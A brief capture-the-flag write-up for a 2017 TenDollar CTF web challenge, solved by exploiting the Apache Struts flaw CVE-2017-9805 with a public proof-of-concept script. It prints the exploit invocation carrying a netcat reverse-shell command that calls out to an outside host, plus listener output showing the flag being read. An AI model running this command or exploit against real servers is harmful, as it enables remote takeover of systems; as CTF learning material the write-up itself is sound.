# [2017_TenDollar] \[WEB] Like Real Hacker

###Solution

```
(CVE-2017-9805) Struts is fucking nurd. Search that shit and capture the flag!

The flag is in /home/joizel/flag
```

Apache Struts 취약점을 이용합니다.



```
python ex.py http://web2.tendollar.kr:9100/ctfquiz1/orders/37 "nc stealthee.kr 9998 | /bin/sh | nc stealthee.kr 9999"
```

```
# nc -lvp 9998
Listening on [0.0.0.0] (family 0, port 9998)
Connection from [45.77.11.103] port 9998 [tcp/*] accepted (family 2, sport 41150)
cat /home/joizel/flag
```

```
# nc -lvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from [45.77.11.103] port 9999 [tcp/*] accepted (family 2, sport 52736)
TDCTF{I_dont_like_Apache_Struts_Vulnerability}
```

POC 코드를 구해서 Exploit 했습니다.